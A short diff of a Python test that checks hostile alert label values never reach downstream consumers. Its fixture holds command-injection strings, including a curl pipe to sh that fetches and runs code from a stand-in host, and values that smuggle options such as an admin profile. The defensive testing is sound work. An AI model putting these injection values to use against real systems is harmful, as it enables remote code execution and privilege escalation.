@@ -82,7 +82,7 @@ def test_citation_quotes_keep_their_characters_but_not_control_or_newlines():
 
 def test_hostile_label_values_never_reach_any_consumer():
     a = _alert(labels={"deployment": "catalog-api; curl -s https://x.example/p | sh; true",
-                       "ecs_service": "warden-pg-fs-orders-api --prof admin",
+                       "ecs_service": "warden-dev-orders-api --prof admin",
                        "namespace": "shop", "lambda": "fn-a,fn-b", "selector": "app=x",
                        "sqs": "--profile=admin", "dynamodb_table": "t1,--region=us-east-1",
                        "apigw": "app=-x"})
